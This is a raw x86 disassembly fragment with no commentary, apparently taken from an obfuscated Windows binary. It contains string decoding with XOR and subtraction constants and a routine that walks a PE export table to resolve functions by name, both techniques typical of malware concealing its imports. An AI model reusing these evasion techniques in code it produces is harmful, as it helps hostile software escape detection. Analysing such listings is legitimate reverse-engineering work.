  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
  42271d:	pop    edi
  42271e:	inc    DWORD PTR [ebp-0x4]
  422721:	mov    cx,WORD PTR [ebp-0xc]
  422725:	cmp    WORD PTR [ebp-0x4],cx
  422729:	jb     0x4226d7
  42272b:	jmp    0x422733
  42272d:	inc    DWORD PTR [ebp-0x8]
  422730:	push   0x7a
  422732:	pop    edi
  422733:	mov    esi,DWORD PTR [ebp+0x8]
  422736:	movzx  ecx,dx
  422739:	cmp    BYTE PTR [ecx+esi*1],0x0
  42273d:	je     0x422752
  42273f:	inc    edx
  422740:	cmp    edi,0x7b
  422743:	jne    0x4226c0
  422749:	xor    eax,eax
  42274b:	pop    edi
  42274c:	pop    esi
  42274d:	pop    ebx
  42274e:	leave  
  42274f:	ret    0x8
  422752:	mov    ecx,DWORD PTR [ebp-0x8]
  422755:	add    ecx,0xffffc4a1
  42275b:	xor    cx,ax
  42275e:	xor    eax,eax
  422760:	cmp    cx,WORD PTR [ebp-0x10]
  422764:	sete   al
  422767:	jmp    0x42274b
  422769:	push   ebp
  42276a:	mov    ebp,esp
  42276c:	sub    esp,0x50
  42276f:	push   edi
  422770:	mov    edi,eax
  422772:	mov    eax,DWORD PTR [edi+0x1a8]
  422778:	cmp    DWORD PTR [eax],0x0
  42277b:	jne    0x422784
  42277d:	xor    eax,eax
  42277f:	jmp    0x4228b5
  422784:	push   DWORD PTR [ebp+0x8]
  422787:	push   0x2c
  422789:	pop    eax
  42278a:	call   0x422519
  42278f:	mov    edx,DWORD PTR [edi+0x1ac]
  422795:	lea    eax,[edi+0x22]
  422798:	mov    DWORD PTR [ebp-0x4c],eax
  42279b:	lea    eax,[edi+0x44]
  42279e:	mov    DWORD PTR [ebp-0x48],eax
  4227a1:	lea    eax,[edi+0x66]
  4227a4:	mov    DWORD PTR [ebp-0x44],eax
  4227a7:	lea    eax,[edi+0x88]
  4227ad:	mov    DWORD PTR [ebp-0x40],eax
  4227b0:	lea    eax,[edi+0xaa]
  4227b6:	mov    DWORD PTR [ebp-0x3c],eax
  4227b9:	lea    eax,[edi+0xcc]
  4227bf:	mov    DWORD PTR [ebp-0x38],eax
  4227c2:	lea    eax,[edi+0xee]
  4227c8:	mov    DWORD PTR [ebp-0x34],eax
  4227cb:	lea    eax,[edi+0x110]
  4227d1:	mov    DWORD PTR [ebp-0x30],eax
  4227d4:	lea    eax,[edi+0x132]
  4227da:	mov    DWORD PTR [ebp-0x2c],eax
  4227dd:	lea    eax,[edi+0x154]
  4227e3:	push   edi
  4227e4:	mov    DWORD PTR [ebp-0x50],edi
  4227e7:	mov    DWORD PTR [ebp-0x28],eax
  4227ea:	call   0x4228e9
  4227ef:	push   eax
  4227f0:	mov    eax,DWORD PTR [edi+0x1a8]
  4227f6:	push   DWORD PTR [eax]
  4227f8:	call   0x42258a
  4227fd:	mov    DWORD PTR [ebp-0x10],eax
  422800:	test   eax,eax
  422802:	je     0x4228b5
  422808:	mov    ecx,DWORD PTR [eax+0x3c]
  42280b:	push   ebx
  42280c:	push   esi
  42280d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  422811:	add    esi,eax
  422813:	mov    edi,DWORD PTR [esi+0x24]
  422816:	mov    ecx,DWORD PTR [esi+0x1c]
  422819:	mov    edx,DWORD PTR [esi+0x20]
  42281c:	mov    ebx,DWORD PTR [esi+0x18]
  42281f:	add    edi,eax
  422821:	mov    DWORD PTR [ebp-0x20],edi
  422824:	mov    edi,DWORD PTR [esi+0x14]
  422827:	add    ecx,eax
  422829:	add    edx,eax
  42282b:	mov    DWORD PTR [ebp-0xc],ecx
  42282e:	mov    DWORD PTR [ebp-0x1c],edx
  422831:	mov    DWORD PTR [ebp-0x8],edi
  422834:	cmp    edi,ebx
  422836:	ja     0x42283b
  422838:	mov    DWORD PTR [ebp-0x8],ebx
  42283b:	xor    ebx,ebx
  42283d:	mov    DWORD PTR [ebp-0x18],ebx
  422840:	cmp    DWORD PTR [ebp-0x8],ebx
  422843:	jbe    0x4228b3
  422845:	jmp    0x42284a
  422847:	mov    edx,DWORD PTR [ebp-0x1c]
  42284a:	mov    edi,DWORD PTR [ebp-0x20]
  42284d:	movzx  edi,WORD PTR [edi+ebx*2]
  422851:	cmp    ebx,DWORD PTR [esi+0x18]
  422854:	jae    0x4228b3
  422856:	cmp    edi,DWORD PTR [esi+0x14]
  422859:	jae    0x4228b3
  42285b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42285e:	mov    edx,DWORD PTR [ebp+0x8]
  422861:	mov    edi,DWORD PTR [ecx+edi*4]
  422864:	mov    DWORD PTR [ebp-0x4],edx
  422867:	lea    edx,[ebp-0x50]
  42286a:	add    ebx,eax
  42286c:	add    edi,eax
  42286e:	sub    edx,DWORD PTR [ebp+0x8]
  422871:	mov    DWORD PTR [ebp-0x14],0xb
  422878:	mov    DWORD PTR [ebp-0x24],edx
  42287b:	mov    edx,DWORD PTR [ebp-0x4]
  42287e:	cmp    DWORD PTR [edx],0x0
  422881:	jne    0x42289e
  422883:	mov    eax,DWORD PTR [ebp-0x24]
  422886:	push   DWORD PTR [eax+edx*1]
  422889:	push   ebx
  42288a:	call   0x422684
  42288f:	mov    ecx,DWORD PTR [ebp-0xc]
  422892:	test   eax,eax
  422894:	je     0x42289b
  422896:	mov    eax,DWORD PTR [ebp-0x4]
  422899:	mov    DWORD PTR [eax],edi
  42289b:	mov    eax,DWORD PTR [ebp-0x10]
  42289e:	add    DWORD PTR [ebp-0x4],0x4
  4228a2:	dec    DWORD PTR [ebp-0x14]
  4228a5:	jne    0x42287b
  4228a7:	mov    ebx,DWORD PTR [ebp-0x18]
  4228aa:	inc    ebx
  4228ab:	mov    DWORD PTR [ebp-0x18],ebx
  4228ae:	cmp    ebx,DWORD PTR [ebp-0x8]
  4228b1:	jb     0x422847
  4228b3:	pop    esi
  4228b4:	pop    ebx
  4228b5:	pop    edi
  4228b6:	leave  
  4228b7:	ret    0x4
  4228ba:	push   ebp
  4228bb:	mov    ebp,esp
  4228bd:	mov    eax,DWORD PTR [ebp+0x8]
  4228c0:	push   esi
  4228c1:	push   DWORD PTR [eax+0x1e0]
  4228c7:	lea    esi,[eax+0x198]
  4228cd:	mov    eax,DWORD PTR [ebp+0x8]
  4228d0:	call   0x422769
  4228d5:	mov    ecx,DWORD PTR [esi]
  4228d7:	mov    DWORD PTR [ecx],eax
  4228d9:	mov    eax,DWORD PTR [esi]
  4228db:	xor    ecx,ecx
  4228dd:	cmp    DWORD PTR [eax],ecx
  4228df:	pop    esi
  4228e0:	setne  cl
  4228e3:	mov    eax,ecx
  4228e5:	pop    ebp
  4228e6:	ret    0x4
  4228e9:	mov    ecx,DWORD PTR [edi+0x188]
  4228ef:	push   ebx
